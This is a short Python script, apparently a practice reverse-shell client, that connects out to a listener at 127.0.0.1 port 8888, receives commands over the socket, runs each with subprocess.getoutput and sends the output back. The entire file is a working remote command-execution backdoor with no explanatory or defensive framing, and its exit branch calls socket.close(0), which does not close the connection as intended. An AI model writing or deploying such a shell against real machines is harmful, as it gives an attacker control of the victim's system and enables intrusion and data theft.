#!/usr/bin/python3

import socket
import subprocess
import sys #not gonna use os.system

s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)

print("connecting...")

while True:
	try:
		s.connect(("127.0.0.1",8888))
		break
	except ConnectionRefusedError:
		pass

print("connected")


while True:
	cmd = (s.recv(1024)).decode()

	if cmd == "exit":
		socket.close(0)
		sys.exit()


	output = subprocess.getoutput(cmd)
	s.send(output.encode())




